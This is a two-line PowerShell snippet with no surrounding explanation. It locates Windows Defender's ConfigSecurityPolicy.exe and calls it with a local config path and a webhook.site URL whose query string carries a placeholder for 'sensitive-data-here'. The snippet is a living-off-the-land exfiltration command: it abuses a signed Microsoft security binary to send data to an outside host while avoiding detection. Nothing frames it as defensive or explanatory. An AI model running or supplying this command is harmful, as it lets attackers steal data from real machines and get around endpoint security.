$path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe"
& $path[0] c:\temp\config.xml "https://webhook.site?d=sensitive-data-here" 